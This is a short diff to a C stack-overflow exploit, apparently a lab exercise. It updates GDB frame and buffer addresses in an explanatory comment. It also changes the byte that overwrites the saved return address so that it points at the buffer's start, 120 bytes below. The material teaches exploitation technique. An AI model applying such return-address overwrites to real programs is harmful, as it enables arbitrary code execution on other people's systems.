@@ -21,13 +21,13 @@ main ( int argc, char * argv[] )
 	INFO FROM GDB:
 
 		% info frame
-			Arglist at 0x2021fee0, args: argc=2, argv=0x7fffffffdf98
- 			Locals at 0x2021fee0, Previous frame's sp is 0x2021fef0
+			Arglist at 0x2021fe80, args: argc=2, argv=0x7fffffffede8
+ 			Locals at 0x2021fe80, Previous frame's sp is 0x2021fe90
  			Saved registers:
-  			rbp at 0x2021fee0, rip at 0x2021fee8
+  			rbp at 0x2021fe80, rip at 0x2021fe88
 
 		% p &buf
-			0x2021fe70
+			0x2021fe10
 
 		Difference between next instruction pointer and starting address of
 		buffer on the stack is 120 bytes. Hence, we need to cause overflow of 
@@ -68,7 +68,7 @@ main ( int argc, char * argv[] )
 	}
 
 	// overwrite return address with buf start address
-	exploit[120] = '\x70';
+	exploit[120] = '\x10';
 	exploit[121] = '\xfe';
 	exploit[122] = '\x21';
 	exploit[123] = '\x20';
